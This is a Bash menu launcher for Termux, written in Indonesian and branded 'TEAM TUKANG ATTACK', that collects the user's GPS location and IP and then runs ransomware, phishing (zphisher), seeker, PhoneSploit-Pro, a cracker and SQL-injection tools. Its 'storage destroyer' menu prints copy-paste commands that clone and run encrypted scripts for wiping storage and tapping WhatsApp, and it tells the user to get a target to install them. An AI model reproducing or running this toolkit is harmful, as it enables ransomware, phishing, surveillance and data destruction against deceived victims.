#!/bin/bash

#font variables
# Fungsi untuk autoketik dengan warna
function autoketik {
    text="$1"
    color="$2"
    for ((i=0; i<${#text}; i++)); do
    echo -n -e "${color}${text:i:1}"
        sleep 0.001 # Durasi delay antar karakter
    done
    echo
  
}
PUBLIC_IP=$(curl -s https://ipinfo.io | jq -r '.ip')

# Mengambil lokasi GPS
LOCATION_DATA=$(termux-location -p gps -r 60)
if [[ -z "$LOCATION_DATA" ]]; then
    echo "$(date) - Gagal mendapatkan lokasi. Pastikan GPS aktif dan Termux memiliki izin lokasi."
    exit 1
fi

LATITUDE=$(echo "$LOCATION_DATA" | grep -o '"latitude":[^,]*' | cut -d':' -f2)
LONGITUDE=$(echo "$LOCATION_DATA" | grep -o '"longitude":[^,]*' | cut -d':' -f2)
CITY=$(curl -s "https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=$LATITUDE&longitude=$LONGITUDE&localityLanguage=en" | jq -r '.city')

# Mendapatkan waktu saat ini
WAKTU=$(date)


bold="\033[1m"
ncol="\033[0m"

# Color variables
red='\033[0;31m'
green='\033[0;32m'
yellow='\033[0;33m'
blue='\033[0;34m'
magenta='\033[0;35m'
cyan='\033[0;36m'
clear



function autoketik {
    text="$1"
    for ((i=0; i<${#text}; i++)); do
        echo -n "${text:i:1}"
        sleep 0.009
    done
    echo
}




echo -e "${magenta}${bold}┌─────────────────────────────────────────────────────────────┐
│                                                             │
│    ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗    │
│    ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝    │
│    █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║       │
│    ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║       │
│    ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║       │
│    ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝       │
│                                         Boot Script 0.1     │
└─────────────────────────────────────────────────────────────┘"

echo -e "${yellow}${bold}       ╔═══════════════════════════════════════════╗ ${clear}"
echo -e "${yellow}${bold}       ║             TEAM TUKANG ATTACK            ║"
echo -e "${yellow}${bold}       ║          AXPLOIT ☢ GALIRUS ☢ FOOCK        ║"
echo -e "${yellow}${bold}       ║          GUNARDI 441 ☢ Mr.4Rex_503∅       ║"
echo -e "${yellow}${bold}       ╚═══════════════════════════════════════════╝"
echo -e "${red}${bold}                🎧PILIH MENU DIBAWAH INI🎧"
echo -e "${cyan}${bold}"
mpv https://f.top4top.io/m_32258aa8u1>clear -&
 echo "[1]. RANSOMEWARE (ROOT)"
 echo "[2]. SPAM TOOLSV5 PREMIUM (PM GALIRUS)"
 echo "[3]. COMINGSOON"
 echo "[4]. SEEKER"
 echo "[5]. PHISHER"
 echo "[6]. PHONE XPLOIT"
 echo "[7]. CEK KHODAM PENDAMPING"
 echo "[8]. TAMPILAN TERMUX"
 echo "[9]. OPEN NOKOS ,DLL (PM FOOCK STORE)"
 echo "[10]. OSINT NUMBER & IP "
 echo "[11]. CRACK ALL TOOLS"
 echo "[12]. SQL INJEQTION PRO"
 echo "[13]. MENU PERUSAK STORAGE "
 echo "[14]. EXIT TOD"
 echo 
 echo "[!]. MUSIK ✓"
 echo "[?]. LAPOR BUG ✓"

# Panjang maksimal yang harus dijaga pada setiap baris adalah 42 karakter di dalam kotak
echo -e "${yellow}${bold}       ╔════════════════════════════════════════════╗ ${clear}"
echo -e "${yellow}${bold}       ║ LOKASI  : $CITY, $COUNTRY                ║"
echo -e "${yellow}${bold}       ║ IP KAMU : $PUBLIC_IP       ║"
echo -e "${yellow}${bold}       ║ WAKTU   : $WAKTU     ║"
echo -e "${yellow}${bold}       ╚════════════════════════════════════════════╝"
sleep 2
echo -e "${red}${bold}"
read -p "┌─[root@localhost]
└──╼>  " pilih
if [ $pilih = "1" ]
then
mpv --volume=150 https://h.top4top.io/m_3225x59oo1.mp3>clear
        echo "SCANING MODE"
        sleep 2
        cd SARA
        python3 sara.py
        bash next.sh 

elif [ $pilih = "!" ]
then
clear
echo""
echo -e "${green} ${bold}"
autoketik "PILIH MUSIK BIAR TIDAK BOSEN"
echo""

autoketik "1. GREEN DAY"
autoketik "2. SIZE THE DAY"
autoketik "3. DMASIV"
autoketik "4. ADA BAND"
autoketik "5. DESA LUKA NEGARA"
autoketik "00. NO MUSIK"
echo""
read -p "Pilih: " pilih

    
    if [ "$pilih" == "1" ]; then
    mpv --volume=150 https://h.top4top.io/m_3225x59oo1.mp3>clear
    mpv  --loop=inf https://b.top4top.io/m_3225rteyn1.mp3>clear -&
    
     elif [ "$pilih" == "2" ]; then
    mpv --volume=150 https://h.top4top.io/m_3225x59oo1.mp3>clear
    mpv --loop=inf https://i.top4top.io/m_3225iw9b11.mp3>clear -&
     elif [ "$pilih" == "3" ]; then
     mpv --volume=150 https://h.top4top.io/m_3225x59oo1.mp3>clear
     mvp --loop=inf https://e.top4top.io/m_3208sappr1.mp3>clear -&
     elif [ "$pilih" == "4" ]; then
     mpv --volume=150 https://h.top4top.io/m_3225x59oo1.mp3>clear
     mpv --loop=inf https://b.top4top.io/m_3209t2c591.mp3>clear -&
     elif [ "$pilih" == "5" ]; then
     mpv --volume=150 https://h.top4top.io/m_3225x59oo1.mp3>clear
     mpv --loop=inf https://f.top4top.io/m_32076391b1.mp3>clear -&
    
     elif [ "$pilih" == "00" ]; then
     mpv --volume=150 https://h.top4top.io/m_3225x59oo1.mp3>clear
    autoketik "ANDA TIDAK MEMAKAI MUSIK"
    
    else
        echo "Pilihan tidak valid. Silakan coba lagi."
        read -p "Tekan Enter untuk mencoba lagi..."
        continue
    fi
    bash next.sh
    
 elif [ $pilih = "?" ]
then 
clear 
xdg-open https://wa.me/6285843466726?text=bug_bang
bash next.sh
elif [ $pilih = "2" ]
then
mpv --volume=150 https://h.top4top.io/m_3225x59oo1.mp3>clear
         echo "BENTAR SAYANG"
         sleep 2 
         echo""
         clear
         echo "GALIRUS"
         xdg-open https://wa.me/6285850268349?text=Galirus_Ganteng_Cihuy_HARGA_TOOLSV5
         sleep 10 
         bash next.sh 
exit
elif [ $pilih = "3" ]
then
mpv --volume=150 https://h.top4top.io/m_3225x59oo1.mp3>clear
        clear
        echo "SCANING MODE"
        sleep 2
        echo "COMINGSOON"
        sleep 3
        
        bash next.sh
        

        

elif [ $pilih = "4" ] 
then 
mpv --volume=150 https://h.top4top.io/m_3225x59oo1.mp3>clear
      echo "SCANING MODE"
      sleep 2 
      clear 
      cd seeker && python3 seeker.py 
      clear
      
      bash next.sh 

elif [ $pilih = "5" ] 
then 
mpv --volume=150 https://h.top4top.io/m_3225x59oo1.mp3>clear
      clear
      echo "SCANING MODE"
      sleep 3 
      clear
      cd zphisher
      bash zphisher.sh
      
      bash next.sh
      
elif [ $pilih = "6" ]
then 
mpv --volume=150 https://h.top4top.io/m_3225x59oo1.mp3>clear
      echo "SCANING MODE"
      sleep 1
      echo
      clear
      cd PhoneSploit-Pro/
      python3 phonesploitpro.py
      clear 
     
      bash next.sh

    
elif [ $pilih = "7" ]
then
   mpv --volume=150 https://h.top4top.io/m_3225x59oo1.mp3>clear      
         echo "scaning mode........"
         sleep 3 
         clear
         echo "sabar tod dukun nya masih sarapan"
         sleep 5 
         
clear
        echo""
        echo -ne '••••                     (33%)\r'
        sleep 1
        echo -ne '••••••••                 (66%)\r'
        sleep 3 
        echo -ne '••••••••••••••••••••••  (100%)\r'
        echo -ne '\n'
        clear 
        
        killall mpv
        
        echo -e "${red}KHODAM KAMU :
           ██████╗░░█████╗░██████╗░██╗
           ██╔══██╗██╔══██╗██╔══██╗██║
           ██████╦╝███████║██████╦╝██║
           ██╔══██╗██╔══██║██╔══██╗██║
           ██████╦╝██║░░██║██████╦╝██║
           ╚═════╝░╚═╝░░╚═╝╚═════╝${clear}"

echo -e "${yellow}"
autoketik "LU PASTI SERING PEGANG LILIN YA TIAP MALAM TOD"
mpv https://j.top4top.io/m_3225jsnfw1.mp3>clear
bash next.sh
      
        sleep 2 
        
        clear
        

elif [ $pilih = "8" ]
then 
    mpv --volume=150 https://h.top4top.io/m_3225x59oo1.mp3>clear   
         clear
         echo "SCANING MODE"
         sleep 3 
         clear
         cd T-Header/
         bash t-header.sh
          bash next.sh 
           sleep 2 
elif [ $pilih = "9" ]
then 
mpv --volume=150 https://h.top4top.io/m_3225x59oo1.mp3>clear
         echo "MEMBUKA TAUTAN WHATSAPP"
         sleep 2 
         xdg-open https://wa.me/62881011828298?text=BANG_FOOCK_NOKOS
          bash next.sh 
elif [ $pilih = "10" ]
then
   mpv --volume=150 https://h.top4top.io/m_3225x59oo1.mp3>clear 
    clear
    echo""
    echo "SCANING MODE"
    sleep 3 
     
    python 1.py
    bash next.sh
 elif [ $pilih = "11" ]
then
mpv --volume=150 https://h.top4top.io/m_3225x59oo1.mp3>clear
    sleep 2
    echo -e "${yellow} ${bold} 
    SCANING MODE"
       
    clear 
 cd Cracker-Tool
 python cracker-main.py
   clear 
 bash next.sh
 elif [ $pilih = "12" ]
then
mpv --volume=150 https://h.top4top.io/m_3225x59oo1.mp3>clear 
    clear
    echo""
    echo "SCANING MODE"
    sleep 3 
    
    bash psqli.sh
   
    bash next.sh
  elif [ $pilih = "13" ]
then
mpv --volume=150 https://h.top4top.io/m_3225x59oo1.mp3>clear
clear
echo""
echo "SCANING MODE"
sleep 3 
clear
echo -e "${green}
─────▄████▀█▄
───▄█████████████████▄
─▄█████.▼.▼.▼.▼.▼.▼▼▼▼
▄███████▄.▲.▲▲▲▲▲▲▲▲
████████████████████▀▀"
echo -e "${red} WARNING !! "
echo -e "${red} JANGAN LOE INSTALL NGENTOD , SURUH INSTALL TARGET LOE LU YANG INSTALL BERARTI LO BODOH , PILIH MENU DI BAWAH "
echo
echo -e "${green}[1]. CLONING GALERY"
echo -e "${green}[2]. MENGHAPUS STORAGE"
echo -e "${green}[3]. KEMBALI KE MENU"
echo 
read -p ">>>>>  " pilih
 
 if [ $pilih = "1" ]
 then 
 clear
 neofetch
 echo -e "${yellow}copy semua command di bawah tod"
 echo -e "${green}
termux-setup-storage 
pkg update && pkg upgrade -y
pkg install git
pkg install bash 
gem install lolcat
pkg install neofetch
git clone https://github.com/EXPLOIT-PANEL/BANNED-WA.git
cd BANNED-WA 
unzip enc.zip
bash main.sh"
echo
read -p "KALO SUDAH DI TEKAN ENTER" enter
 bash next.sh
elif [ $pilih = "2" ]
then
clear
neofetch
echo -e "${yellow}COPY SC DIBAH INI TOD"
echo -e "${green}
termux-setup-storage
pkg update && pkg upgrade -y
pkg install git
pkg instal bash
pkg install neofetch
git clone https://github.com/EXPLOIT-PANEL/sadap-wa.git
cd sadap-wa
unzip enc.zip
bash sadap.sh"
echo
read -p "KALO SUDAH TEKAN ENTER" enter
bash next.sh
elif [ $pilih = "3" ]
then
clear
bash next.sh
fi



elif [ $pilih = "14" ]
then
    mpv --volume=150 https://h.top4top.io/m_3225x59oo1.mp3>clear   
       clear
       
        killall mpv
        
        echo
        echo -e "${magenta}${bold}
████████╗██╗░░██╗░█████╗░███╗░░██╗██╗░░██╗
╚══██╔══╝██║░░██║██╔══██╗████╗░██║██║░██╔╝
░░░██║░░░███████║███████║██╔██╗██║█████═╝░
░░░██║░░░██╔══██║██╔══██║██║╚████║██╔═██╗░
░░░██║░░░██║░░██║██║░░██║██║░╚███║██║░╚██╗
░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═╝░░╚═╝

██╗░░░██╗░█████╗░██╗░░░██╗
╚██╗░██╔╝██╔══██╗██║░░░██║
░╚████╔╝░██║░░██║██║░░░██║
░░╚██╔╝░░██║░░██║██║░░░██║
░░░██║░░░╚█████╔╝╚██████╔╝
░░░╚═╝░░░░╚════╝░░╚═════╝░ ${ncol}"

        mpv dana.mp3>clear
        echo""
       
       
       
        exit
        
   
  else
   autoketik "salah bego ${NC}"
  sleep 1
   
  read -p "pilih : " pilih
  clear
    
  killall mpv
         





fi     
           
           



        
         
         
         
        

    
    



    
   
   
   
    




  
   
    
    



        
    
        
        
        
        
        
      
        
        
        
       
      
 

  































        
         
        
        
        


